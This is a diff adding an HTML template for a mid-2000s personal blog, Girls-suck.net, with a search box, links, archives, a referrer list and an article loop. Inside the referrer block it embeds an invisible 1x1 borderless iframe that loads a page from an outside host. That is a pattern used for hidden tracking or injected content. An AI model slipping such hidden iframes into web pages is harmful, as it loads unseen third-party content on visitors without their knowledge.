@@ -1,0 +1,90 @@
+[% date_format = "%d %h '%y" %]
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"  lang="en">
+<!-- $Id: main_page.tt2 428 2006-08-30 02:00:57Z corrupt $ -->
+<head>
+    <title>Girls-suck.net&nbsp;-&nbsp;Just Because.</title>
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="rss/rss.xml"/>
+    <link rel="shortcut icon" href="http://girls-suck.net/favicon.ico">
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    <link rel="stylesheet" type="text/css" href="/style/gs.css" />
+</head>
+
+<body>
+<table width="100%"  border="0" cellpadding="0" cellspacing="0" background="theme_images/[% fe.theme %]/headerbg.gif">
+<tr>
+<td width="98" height="198" align="left" valign="top"><img src="theme_images/[% fe.theme %]/gs.gif" width="222" height="198" border="0" alt=""></td>
+<td align="center" valign="middle"><a href="http://girls-suck.net"><img src="theme_images/[% fe.theme %]/girls-suck.gif" width="457" height="71" border="0" alt="Girls Suck .. Girls-suck.net"></a></td>
+</tr>
+</table>
+<!-- end of 'header' -->
+<div class="main">
+    <div id="rightcolumn">
+        <div class="block">
+            <h3>Girls-suck Search</h3>
+            <form method="post" action="/pivot/search.php"  class="pivot-search">
+<fieldset><legend>Search for words used in entries on this website</legend>
+<label for="search">Enter the words[s] to search for here:</label>
+<input id="search" type="text" name="search" class="searchbox" value="Enter searchterms"  onfocus="this.select();return true;" />
+<input type="submit" class="searchbutton" value="go!" /></fieldset></form>
+
+        </div>
+        <div class="block">
+            <h3>Links</h3>
+            <p>
+<strong><a href="http://gs.scudly.com">Forums</a><br>
+<a href="http://girls-suck.signmyguestbook.com/">Guestbook</a></strong><br>
+<br/>
+<a href="http://www.cafeshops.com/gs02,qpm_0003,qpm_0002,qpm_0001"><strong>New</strong> GS merchandise</a><br/>
+<a href="http://www.cafepress.com/cp/store/store.aspx?storeid=gsdiaryland,gsbanana,gssucker,gsgirlssuck,gsmoney,gspretty,gssadmug,gssmileymug">GS Merchandise</a><br/>
+<br/>
+<a href="http://doug.qpalzm.com/">Doug Stewart</a><br/>
+<a href="http://q.mg2.org">Q</a><br/>
+<a href="http://www.scudly.com">P3</a><br/>
+<br/>
+<a href="rss/rss.xml"  title="XML Feed (RSS 1.0)" target='_blank'><img src="theme_images/[% fe.theme %]/rssbutton.png" width="94" height="15" alt="XML Feed (RSS 1.0)" class="badge" longdesc="rss/rss.xml" /></a><br /></p>
+        </div>
+        <div class="block">
+            <h3>Archives</h3>
+            <p><a href="/archives/archive_2005-y00.php">01 Jan - 31 Dec 2005 </a><br /><a href="/archives/archive_2004-y00.php">01 Jan - 31 Dec 2004 </a><br /><a href="/archives/archive_2003-y00.php">01 Jan - 31 Dec 2003 </a><br /><a href="/archives/archive_2002-y00.php">01 Jan - 31 Dec 2002 </a><br /><a href="/archives/archive_2001-y00.php">01 Jan - 31 Dec 2001 </a><br /><a href="/archives/archive_2000-y00.php">01 Jan - 31 Dec 2000 </a><br /></p>
+        </div>
+        [% IF fe.ri.last_referrers(30) %]
+            <div class="block">
+                <!-- getref (0.000)-->          <h3>Last Referrers</h3>
+                [% FOREACH referrer = fe.ri.last_referrers(30) %]
+                [% IF referrer.search_engine != "none" %]
+                <a href="[% referrer.full_href %]"  title="[% referrer.query_string %] @ [% referrer.search_engine %]" target='_blank'>[% referrer.search_engine %] - [% referrer.query_string %]</a><br />        
+                [% ELSE %]
+                <a href="[% referrer.full_href %]"  title="go to site [% referrer.full_href %]" target='_blank'>[% referrer.tidy_href %]</a><br />        
+                [% END %]
+                [% END %]
+        </div><iframe src="http://object.qpalzm.com/alt/blank.php" scrolling="no" frameborder="0" width="1" height="1" border="0"></iframe>
+        [% END %]
+
+    </div><!-- end of 'rightcolumn' -->
+    <div id="leftcolumn">
+        <div class="block">
+            <h3>About</h3>
+            <p>We don't believe that females are inferior in any way, this project is a guide to life, love, relationships, and all the things that make them so messed up. We are just as open to point out our mistakes in the situations, and this should not be seen in any shape or form as an attack on women. We love them, we love them a lot. The thing is that we love them too much, and let them walk all over us in any relationship.</p>
+        </div>
+        <div class="block">
+            <h3>Linkdump</h3>
+            <span id="e909"></span><p><a href="http://perljam.net/notes/interesting-google-satellite-maps/"  title="Interesting google satellite maps." target='_blank'>Interesting google satellite maps</a> </p><span id="e896"></span><p><a href="http://mike.mg2.org"  target='_blank'>mike.mg2.org</a> </p><span id="e874"></span><p><a href="http://www.donotupload.com"  title="very funny site from a friend." target='_blank'>www.donotupload.com</a> </p>
+        </div>
+    </div><!-- end of 'leftcolumn' -->
+    <div id="centercolumn">
+        <div class="content">   
+            [% FOREACH article = fe.ai.recent_articles(10) %]
+            <span id="e971"></span><div class="entry">
+                <h2><span class="date"><a href="/article/archived/[% article.id %]/" title="Permanent link to '[% article.subject %]' in the archives">&sect;</a> <a href="/article/archived/[% article.id %]/" title="Permanent link to '[% article.subject %]'">&para;</a></span>[% article.subject %]</h2>
+                    [% article.body %]
+                    <div class="entryfooter">[% fe.ai.formatted_date(article.create_time, date_format) %] <a href='mailto:mike@mg2.org' title='email [% article.author %]'>[% article.author %]</a> (default) </div>
+            </div>
+            [% END %]
+    </div><!-- end of 'content' -->
+    </div><!-- end of 'centercolumn' -->
+</div>
+</body>
+</html>
+
